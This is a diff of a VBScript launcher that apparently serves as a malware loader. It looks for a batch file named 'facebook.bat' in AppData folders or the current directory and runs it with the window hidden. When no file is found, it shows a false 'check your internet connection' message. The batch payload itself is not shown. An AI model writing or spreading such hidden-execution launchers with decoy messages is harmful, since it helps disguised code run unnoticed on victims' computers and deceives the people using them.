@@ -1,39 +1,29 @@
-dim FSO, objShell, strApp
-set FSO = CreateObject("Scripting.FileSystemObject")
-set WshShell = CreateObject("Wscript.Shell")
+Dim FSO
+Set WshShell = CreateObject( "WScript.Shell" )
+Set FSO = CreateObject("Scripting.FileSystemObject")
 
 
+User = WshShell.ExpandEnvironmentStrings( "%USERNAME%" )
+Loc1 = "C:\Users\"+ User + "\AppData\Roaming\facebook.bat"
+Loc2 = "C:\Users\"+ User + "\AppData\Local\0101\facebook.bat"
+Loc3 = ".\facebook.bat"
+Currnt = "C:\Users\"+ User + "\AppData\Roaming"
 
-
-'//get system path
-strApp = FSO.GetSpecialFolder(1) & "\facebook.bat"
-if FSO.FileExists(strApp) then
-    '//no need to change directory as you have the full path
-    WshShell.Run(strApp & " /disable")
-else
-   '//does not exist
-   appDataLocation=WshShell.ExpandEnvironmentStrings("%APPDATA%")
-   WshShell.CurrentDirectory=appDataLocation
-
-   WshShell.Run chr(34) & appDataLocation & "\facebook.bat" & Chr(34), 0
+If fso.FileExists(Loc1) Then
+   WshShell.CurrentDirectory=Currnt 
+   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Roaming\facebook.bat" & Chr(34), 0
    Set WshShell = Nothing 
 
-end if
+Elseif fso.FileExists(Loc2) Then
+   WshShell.CurrentDirectory=Currnt 
+   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\0101\facebook.bat" & Chr(34), 0
+   Set WshShell = Nothing 
 
+Elseif fso.FileExists(Loc3) Then
+   WshShell.Run chr(34) & ".\facebook.bat" & Chr(34), 0
+   Set WshShell = Nothing 
 
+Else
+   MsgBox "Please check your internet connection and try again!"
 
-
-
-
-'no need this is comment
-'Set WshShell=CreateObject("WScript.Shell") 
-'appDataLocation=WshShell.ExpandEnvironmentStrings("%APPDATA%")
-'WshShell.CurrentDirectory=appDataLocation
-
-'WshShell.Run chr(34) & appDataLocation & "\facebook.bat" & Chr(34), 0
-'Set WshShell = Nothing 
-
-
-
-
-
+End If
